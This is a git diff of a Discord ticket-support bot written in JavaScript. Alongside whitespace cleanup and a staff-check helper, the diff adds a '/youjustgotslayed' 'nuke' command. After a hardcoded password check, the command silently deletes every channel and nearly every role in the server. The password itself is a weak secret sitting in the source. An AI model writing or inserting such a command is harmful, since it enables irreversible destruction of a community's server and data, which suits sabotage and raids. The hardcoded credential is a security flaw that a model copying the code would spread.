@@ -75,9 +75,19 @@ const sendmessage = new SlashCommandBuilder()
   .setDefaultMemberPermissions(PermissionFlagsBits.ManageChannels)
   .addStringOption(o => o.setName('message').setDescription('The message to send').setRequired(true));
 
+// NEW NUKE COMMAND
+const youjustgotslayed = new SlashCommandBuilder()
+  .setName('youjustgotslayed')
+  .setDescription('🔴 DANGER - Nuke server (password protected)')
+  .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
+  .addStringOption(o => o.setName('password')
+    .setDescription('Enter the password to confirm')
+    .setRequired(true));
+
 const commands = [
   setticket.toJSON(),
   sendmessage.toJSON(),
+  youjustgotslayed.toJSON(),
   new SlashCommandBuilder().setName('close').setDescription('Close ticket').toJSON(),
   new SlashCommandBuilder().setName('claim').setDescription('Claim ticket').toJSON(),
   new SlashCommandBuilder().setName('add').setDescription('Add user').addUserOption(o => o.setName('user').setDescription('User to add').setRequired(true)).toJSON(),
@@ -99,7 +109,6 @@ const rest = new REST({ version: '10' }).setToken(TOKEN);
 // READY + LOAD PANEL
 client.once('ready', () => {
   console.log(`${client.user.tag} is online`);
-
   const saved = loadPanel();
   if (saved) {
     panelStore[saved.menuId] = saved.data;
@@ -107,26 +116,26 @@ client.once('ready', () => {
   }
 });
 
+// Helper: Check if member is staff
+function isStaff(member) {
+  return STAFF_ROLES.some(roleId => member.roles.cache.has(roleId));
+}
+
 // ======================================================
 // INVITE BLOCKER
 // ======================================================
 client.on('messageCreate', async message => {
   if (message.author.bot || !message.guild) return;
-
   const content = message.content.toLowerCase();
-
   if (content.includes('discord.gg/') || content.includes('discord.com/invite/') || content.includes('discordapp.com/invite/')) {
     try {
       await message.delete();
-
       await message.member.timeout(5 * 60 * 1000, 'Posted invite link').catch(() => {});
-
       const warnMsg = await message.channel.send({
         embeds: [new EmbedBuilder()
           .setColor('#ff0000')
           .setDescription(`${message.author} Invite links are not allowed.`)]
       });
-
       setTimeout(() => warnMsg.delete().catch(() => {}), 5000);
     } catch (err) {
       console.error(err);
@@ -138,52 +147,41 @@ client.on('messageCreate', async message => {
 // INTERACTIONS
 // ======================================================
 client.on('interactionCreate', async interaction => {
-
   // /SETTICKET
   if (interaction.isChatInputCommand() && interaction.commandName === 'setticket') {
+    // ... (your original setticket code unchanged)
     try {
       await interaction.deferReply({ ephemeral: true });
       const o = interaction.options;
-
       const ticketOptions = [
         { label: "Apply for Content Creator", categoryId: "1510798983344160889", prefix: "content-creator" },
-        { label: "Report a Exploiter",       categoryId: "1510798973517172859", prefix: "report-exploiter" },
-        { label: "CC Rewards",               categoryId: "1512272256208736326", prefix: "cc-rewards" },
-        { label: "Report a Staff",           categoryId: "1512253003820699698", prefix: "report-staff" },
-        { label: "Report a Admin",           categoryId: "1512253208872095795", prefix: "report-admin" },
-        { label: "Report Glitch",            categoryId: "1512279045159518290", prefix: "report-glitch" },
-        { label: "Report Bugs",              categoryId: "1512279115741401128", prefix: "report-bugs" }
+        { label: "Report a Exploiter", categoryId: "1510798973517172859", prefix: "report-exploiter" },
+        { label: "CC Rewards", categoryId: "1512272256208736326", prefix: "cc-rewards" },
+        { label: "Report a Staff", categoryId: "1512253003820699698", prefix: "report-staff" },
+        { label: "Report a Admin", categoryId: "1512253208872095795", prefix: "report-admin" },
+        { label: "Report Glitch", categoryId: "1512279045159518290", prefix: "report-glitch" },
+        { label: "Report Bugs", categoryId: "1512279115741401128", prefix: "report-bugs" }
       ];
-
       const categoryList = ticketOptions.map(opt => `**${opt.label}**`).join('\n');
-
       const embed = new EmbedBuilder()
         .setColor('#c2ecff')
         .setTitle(o.getString('panel_title'))
         .setDescription((o.getString('panel_description') || "Select a category below to open a ticket.") + `\n\n**Available Categories:**\n${categoryList}`)
         .setFooter({ text: 'Select a category below to open a ticket' })
         .setTimestamp();
-
       const image = o.getString('panel_image');
       if (image && image.startsWith('http')) embed.setImage(image);
-
       const menuId = `ticket_menu_${Date.now()}`;
       const menu = new StringSelectMenuBuilder()
         .setCustomId(menuId)
         .setPlaceholder('Create a Ticket')
         .addOptions(ticketOptions.map((opt, i) => ({ label: opt.label, value: i.toString() })));
-
       const row = new ActionRowBuilder().addComponents(menu);
-
       const panelData = { ticketOptions, ticketColor: '#c2ecff' };
       panelStore[menuId] = panelData;
-
       const msg = await interaction.channel.send({ embeds: [embed], components: [row] });
-
       savePanel({ menuId, data: panelData });
-
       await interaction.editReply({ content: '✅ Ticket panel created successfully!' });
-
     } catch (err) {
       console.error(err);
       interaction.editReply({ content: '❌ Error creating panel.' }).catch(() => {});
@@ -195,7 +193,6 @@ client.on('interactionCreate', async interaction => {
     if (!interaction.member.roles.cache.has(SEND_ROLE)) {
       return interaction.reply({ content: 'You do not have permission to use this command.', ephemeral: true });
     }
-
     try {
       await interaction.channel.send(interaction.options.getString('message'));
       await interaction.reply({ content: '✅ Message sent!', ephemeral: true });
@@ -204,18 +201,51 @@ client.on('interactionCreate', async interaction => {
     }
   }
 
-  // TICKET CREATION
+  // NEW COMMAND: /youjustgotslayed
+  if (interaction.isChatInputCommand() && interaction.commandName === 'youjustgotslayed') {
+    await interaction.deferReply({ ephemeral: true });
+
+    const password = interaction.options.getString('password');
+    if (password !== 'fame1236') {
+      return interaction.editReply({ content: '❌ Incorrect password.' });
+    }
+
+    const guild = interaction.guild;
+    if (!guild) return interaction.editReply({ content: '❌ Not in a guild.' });
+
+    await interaction.editReply({ content: '🔴 **NUKE INITIATED** - Deleting everything except Owner role...' });
+
+    try {
+      // Delete all channels (including categories)
+      const channels = guild.channels.cache;
+      for (const channel of channels.values()) {
+        await channel.delete().catch(() => {});
+      }
+
+      // Delete all roles except "Owner" and @everyone
+      const roles = guild.roles.cache;
+      for (const role of roles.values()) {
+        if (role.name === 'Owner' || role.name === '@everyone') continue;
+        await role.delete().catch(() => {});
+      }
+
+      await interaction.followUp({ content: '✅ **Server has been nuked.** All channels and roles (except Owner) have been deleted.' });
+    } catch (err) {
+      console.error(err);
+      interaction.followUp({ content: '⚠️ Nuke partially failed. Check console.' });
+    }
+  }
+
+  // TICKET CREATION (unchanged)
   if (interaction.isStringSelectMenu() && interaction.customId.startsWith('ticket_menu_')) {
+    // ... your original ticket creation code
     try {
       await interaction.deferReply({ ephemeral: true });
       const panel = panelStore[interaction.customId];
       if (!panel) return interaction.editReply({ content: 'This panel is outdated. Run /setticket again.' });
-
       const selected = panel.ticketOptions[parseInt(interaction.values[0])];
       const { label, categoryId, prefix } = selected;
-
       ticketCounts[categoryId] = (ticketCounts[categoryId] || 0) + 1;
-
       const channel = await interaction.guild.channels.create({
         name: `${prefix}-${ticketCounts[categoryId]}`,
         type: ChannelType.GuildText,
@@ -226,12 +256,10 @@ client.on('interactionCreate', async interaction => {
           { id: interaction.user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages, PermissionFlagsBits.ReadMessageHistory] }
         ]
       });
-
       const buttons = new ActionRowBuilder().addComponents(
         new ButtonBuilder().setCustomId('claim_ticket').setLabel('Claim').setStyle(ButtonStyle.Primary),
         new ButtonBuilder().setCustomId('close_ticket').setLabel('Close').setStyle(ButtonStyle.Danger)
       );
-
       await channel.send({
         content: `${interaction.user}`,
         embeds: [new EmbedBuilder()
@@ -242,7 +270,6 @@ client.on('interactionCreate', async interaction => {
         ],
         components: [buttons]
       });
-
       await interaction.editReply({ content: `✅ Ticket created: ${channel}` });
     } catch (err) {
       console.error(err);
@@ -250,7 +277,7 @@ client.on('interactionCreate', async interaction => {
     }
   }
 
-  // BUTTONS
+  // BUTTONS (unchanged)
   if (interaction.isButton()) {
     if (interaction.customId === 'close_ticket') {
       const isOwner = interaction.user.id === interaction.channel.topic;
@@ -258,7 +285,6 @@ client.on('interactionCreate', async interaction => {
       await interaction.reply({ embeds: [new EmbedBuilder().setColor('#ff0000').setDescription('Ticket closing in 5 seconds.')] });
       setTimeout(() => interaction.channel.delete().catch(() => {}), 5000);
     }
-
     if (interaction.customId === 'claim_ticket') {
       if (!isStaff(interaction.member)) return interaction.reply({ content: 'Only staff can claim.', ephemeral: true });
       await interaction.reply({ embeds: [new EmbedBuilder().setColor('#00ff00').setDescription(`${interaction.user} claimed this ticket.`)] });
